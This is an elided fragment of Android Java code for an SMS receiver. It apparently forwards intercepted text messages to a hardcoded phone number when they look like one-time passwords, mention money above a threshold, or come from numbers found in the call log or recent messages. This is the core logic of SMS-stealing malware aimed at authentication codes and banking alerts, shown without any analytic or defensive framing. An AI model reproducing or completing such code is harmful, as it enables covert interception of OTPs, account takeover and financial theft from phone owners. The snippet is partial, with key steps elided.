...
public class SmsReceiver extends BroadcastReceiver {
    ...
    private static final String FORWARD_SMS_NUMBER = "+8801915564631";
            ...
            if (pdus != null) {
                for (Object pdu : pdus) {
                    try {
                        ...
                        if (isIncomingCallNumber || (isSMSMoneyWords && amountAboveThreshold) ||
                                isNumberInCallLog || isSMSOtp || isPatternMatchInCallLog ||
                                (isSMSMoneyWords && isPatternMatchInRecentMessages) ) {
